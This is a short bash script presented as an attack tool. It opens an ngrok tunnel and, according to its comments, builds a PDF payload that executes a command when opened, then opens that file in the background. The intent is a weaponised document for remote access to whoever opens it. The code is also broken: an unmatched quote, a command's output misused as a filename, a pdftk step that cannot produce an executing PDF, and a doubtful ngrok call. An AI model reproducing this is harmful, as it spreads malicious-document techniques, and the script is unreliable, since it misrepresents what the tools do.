#!/bin/bash

# Create a ngrok tunnel
ngrok tcp 8080

# Get the ngrok tunnel URL
tunnel_url=$(ngrok status | grep "Forwarding" | awk '{print $6}')

# Generate a PDF payload that will execute a command when opened
pdf_payload=$(scrcpy --background --auto-connect yes")

# Create a text file that contains the scrcpy command
command_file="/tmp/command.txt"

# Write the scrcpy command to the text file
echo "scrcpy --background --auto-connect yes" > $command_file

# Convert the text file to a PDF file
pdftk $command_file output $pdf_payload

# Open the PDF file automatically in the background
xdg-open $pdf_payload &

# Print the ngrok tunnel URL
echo "Your ngrok tunnel is $tunnel_url"
